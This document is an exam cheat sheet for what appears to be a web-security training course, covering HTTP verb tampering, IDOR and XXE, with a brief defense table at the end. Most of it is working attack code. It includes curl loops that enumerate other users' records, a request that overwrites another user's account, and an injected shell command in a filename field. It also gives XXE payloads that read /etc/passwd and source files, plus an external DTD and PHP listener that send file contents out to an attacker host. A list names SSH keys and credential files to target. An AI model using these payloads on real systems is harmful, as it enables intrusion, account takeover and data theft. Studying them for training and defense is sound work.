# Web Attacks — Exam Cheat Sheet

Three vuln classes covered: **HTTP Verb Tampering**, **IDOR**, **XXE**. The skills assessment combines all three.

---

## HTTP Verb Tampering

### Recognition
| Pattern | Verb-tampering risk |
|---------|---------------------|
| Apache `<Limit GET POST>` (denylist) | Other verbs bypass auth |
| Apache `<LimitExcept GET POST>` (allowlist) | Safe |
| J2EE `<http-method>GET</http-method>` (per-verb) | Other verbs bypass |
| `.NET <authorization>` with `verbs="GET"` | Other verbs bypass |
| PHP validates `$_POST['x']` but acts on `$_REQUEST['x']` | Switch verb so $_POST is empty |

### Quick test
```bash
for v in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  printf "%-7s " "$v"
  curl -skI -X $v -o /dev/null -w "%{http_code}\n" "$URL/path"
done
```
> Sends a HEAD-only request (`-I`) for each HTTP verb and prints the status code. A 200 where you expected a 403, or a different response size, confirms the endpoint responds differently to that verb.

### Bypass on auth
```bash
# Apache <Limit GET POST> denying these
curl -X DELETE "$URL/admin/reset.php"
```
> Sends a DELETE request to an endpoint protected by `<Limit GET POST>`. Because DELETE is not listed in the limit block, Apache does not apply the auth rule and the request goes through.

### Bypass on input source mismatch
```bash
# Filter on $_POST['filename'], action on $_REQUEST['filename']
curl -X POST "$URL/path" -d "filename=; cp /flag .;"

# OR with query string when validator reads $_POST
curl -X PUT "$URL/reset.php?uid=52&token=$T&password=p"
```
> First form exploits a server that validates `$_POST` but acts on `$_REQUEST` — switching verb moves the parameter from POST body to GET so the filter never sees it. Second form puts parameters in the query string so `$_POST` is empty and validation is skipped.

---

## IDOR (Insecure Direct Object Reference)

### Two flavors
| Type | Effect |
|------|--------|
| Information disclosure | Read another user's data |
| Insecure function call | Modify/delete other users' state, or call admin-only fn |

### Where to look
- Path params: `/profile/42`, `/api/user/42`
- Query params: `?id=42`, `?uid=42`
- Cookies: `Cookie: uid=42`
- Hidden form fields
- AJAX request bodies

### Mass enumeration (GET)
```bash
for i in {1..100}; do
  curl -sk "$URL/api.php/user/$i" >> /tmp/users.txt
done
```
> Iterates UIDs 1 through 100 and appends each response to a file. Review the file for unexpected data — admin entries, emails, or roles you should not be able to see. Adjust the range based on what IDs you already know exist.

### Mass enumeration (POST)
```bash
for i in {1..100}; do
  curl -sk -X POST -d "uid=$i" "$URL/download.php" -OJ
done
```
> Sends POST requests with each UID and saves each response as a file (`-OJ` uses the server-provided filename). Useful for downloading documents or files that belong to other users when the endpoint accepts a user ID parameter.

### Encoded references
| Encoding | Reproduce |
|----------|-----------|
| base64 | `echo -n VALUE \| base64 -w 0` |
| md5 | `echo -n VALUE \| md5sum \| tr -d ' -'` |
| md5(base64(X)) | `echo -n X \| base64 -w 0 \| md5sum \| tr -d ' -'` |
| sha256 | `echo -n VALUE \| sha256sum \| tr -d ' -'` |

ALWAYS inspect the front-end JS first — encoding scheme is visible there.

### Chain — GET IDOR → PUT IDOR
```bash
# 1. Read target's uuid/role via GET
curl -sk "$URL/api.php/user/52"
# {"uid":"52","uuid":"abc","role":"admin",...}

# 2. PUT to update target using leaked uuid
curl -sk -X PUT "$URL/api.php/user/52" \
  -H "Content-Type: application/json" \
  -d '{"uid":"52","uuid":"abc","role":"admin","email":"new@x.com"}'
```
> Step 1 reads a user object you should not have access to — the response leaks the `uuid` and `role` fields. Step 2 replays those leaked values back in a PUT request to modify the account. Use the leaked `uuid` as it is often the server's authorization check.

### Token reset IDOR pattern
```
GET /api.php/token/{uid}   → leak reset token
POST /reset.php uid token   → reset password
```
If `/api.php/token/{uid}` has no session check, you reset any user.

---

## XXE (XML External Entity)

### Recognition
- `Content-Type: application/xml` or `text/xml`
- Body looks like `<root>...</root>`
- AJAX builds XML via string concat (`xmlhttp.send(xml)`)
- File uploads accepting SVG/DOCX/XLSX/EPUB (all XML internally)
- SOAP, SAML, RSS feeds

### Basic file read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<root><email>&x;</email></root>
```
> Defines an external entity `x` that reads `/etc/passwd`, then references it inside the `<email>` tag. If the response echoes the email field back, the file contents appear there. Replace `/etc/passwd` with any file path.

### PHP source disclosure
```xml
<!DOCTYPE r [
  <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file.php">
]>
<root><email>&x;</email></root>
```
> Uses the PHP filter wrapper to base64-encode the file before the parser reads it. This prevents PHP from executing the file and returns the raw source. Decode the response with `echo "..." | base64 -d`.

### CDATA via external DTD (binary/source-safe for any language)
**xxe.dtd** (hosted on attacker):
```xml
<!ENTITY joined "%begin;%file;%end;">
```
> This DTD file wraps the file contents in CDATA so the parser does not interpret special characters inside the file. Host this file on your HTTP server before sending the payload to the target.

**Payload to target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file  SYSTEM "file:///var/www/html/secret.php">
  <!ENTITY % end   "]]>">
  <!ENTITY % xxe   SYSTEM "http://ATTACKER:8000/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```
> Fetches your external DTD which defines `joined` as a CDATA-wrapped version of the target file. The `&joined;` reference in the body causes the file contents to appear in the response inside a CDATA block that prevents XML parsing errors.

### Error-based (no reflection, but verbose errors)
```xml
<!-- DTD hosted on attacker -->
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExisting;/%file;'>">
%error;

<!-- payload to target -->
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://ATTACKER:8000/xxe.dtd">
  %remote;
  %error;
]>
<root><email>x</email></root>
```
> Causes the parser to try to load a path that includes the file contents. Since the path does not exist, the parser throws an error that includes the attempted path — which contains the file data. Use this when the response body does not reflect entity values but verbose errors are enabled.

### Blind OOB exfiltration
**index.php** (listener — auto-decodes base64):
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
> Receives the base64-encoded file contents as a URL parameter and decodes them to the PHP error log. Start this with `php -S 0.0.0.0:8000`. Read the log at `/var/log/apache2/error.log` or wherever PHP writes errors.

**xxe.dtd** (hosted on attacker):
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/FILE">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER:8000/?content=%file;'>">
%oob;
```
> Reads the target file as base64, then builds a URL that sends it to your listener as the `content` parameter. Replace `/FILE` with the absolute path of the file you want to read.

**Payload to target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://ATTACKER:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
> Fetches the external DTD, expands the `%oob` entity, and fires the out-of-band HTTP request to your listener with the file contents. The server makes this request even if the response body never reflects any entity values.

### XXEinjector (automation)
```bash
git clone https://github.com/enjoiz/XXEinjector.git
ruby XXEinjector.rb \
  --host=YOUR_IP --httpport=8000 \
  --file=/tmp/xxe.req \
  --path=/etc/passwd \
  --oob=http --phpfilter
```
> Automates XXE exploitation using a saved HTTP request file as a template. Replace `YOUR_IP` with your tun0 address. `--oob=http` uses out-of-band exfiltration and `--phpfilter` adds the base64 filter for PHP targets.

### URI schemes by language
| Target | Schemes |
|--------|---------|
| PHP | file, http, php://filter (universal), expect (if loaded) |
| Java | file, http, jar, netdoc |
| .NET | file, http |
| Python | file, http (recent lxml has external entities disabled) |

---

## High-Value File Targets

```
Linux:
/etc/passwd                   ← always tries first
/etc/hosts
/etc/shadow                   ← rarely readable
/proc/self/cwd/index.php      ← read from cwd without knowing path
/proc/self/environ            ← env vars (DB creds, secrets)
/proc/self/cmdline
/home/<u>/.ssh/id_rsa
/var/www/html/.env
/etc/apache2/sites-enabled/000-default.conf  ← reveals DocumentRoot
/flag.php                     ← labs often put it at filesystem root

Windows:
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

---

## Skills Assessment Chain (Module Combiner)

```
1. Login as low-priv user
2. Find IDOR endpoint (token, profile) — enumerate to identify admin
3. Find verb-tamper or auth bypass on a write endpoint (password reset)
4. Combine: take over admin account
5. Find XML-parsing endpoint reachable only as admin (event creator, import)
6. XXE → read /flag.php via php://filter/convert.base64-encode
```

---

## Quick Decision Tree

| You have... | Try... |
|-------------|--------|
| HTTP form posting XML | XXE — start with `<!ENTITY x "test">`, then `file://` |
| HTTP form posting form data | Verb tampering — sweep methods, watch for code/size diff |
| API with `/resource/{id}` | IDOR — vary id, then test all 4 verbs |
| Encoded ID (`?id=NDI=`) | Read front-end JS for encoder, reproduce, enumerate |
| XML field reflected | Basic XXE with `file://` or `php://filter` |
| XML field NOT reflected, errors shown | Error-based XXE |
| XML field NOT reflected, no errors | OOB XXE with external DTD |
| Admin endpoint redirects | Check if admin role is in cookie (tamper) or session (escalate via IDOR) |

---

## Common Gotchas

- **lab variants differ from documentation** — always inspect the actual JS / form behavior before scripting
- **Apache `<FilesMatch ".+\.ph(ar|p|tml)">` with no `$`** lets you upload `shell.phtml.jpg`
- **echo -n + base64 -w 0** — trailing newlines change hashes/encoded values
- **`$IFS` substitutes for spaces** in `expect://` payloads
- **billion-laughs DoS is blocked** on modern parsers — don't waste time
- **Flag files often live at `/flag.php`** (filesystem root), not `/var/www/html/`
- **Server-side authZ on every endpoint** is the only real IDOR fix — encoding/UUIDs are obfuscation
- **`$_REQUEST` vs `$_POST`** — verb tampering can switch the input source

---

## Defense Quick Notes

| Attack | Primary fix |
|--------|-------------|
| Verb tampering (Apache) | Use `<LimitExcept>` (allowlist) — never `<Limit>` (denylist) |
| Verb tampering (code) | Read ONE consistent input source (`$_POST` only, not `$_REQUEST`) |
| IDOR | Server-side authZ on every method — owner_id check or RBAC |
| IDOR enumeration | UUID v4 references — but ONLY as defense in depth |
| XXE | Disable external entities in parser config (lib default in modern versions) |
| Error-based XXE | Disable verbose errors in production |
| Blind XXE | Egress filtering on app tier |
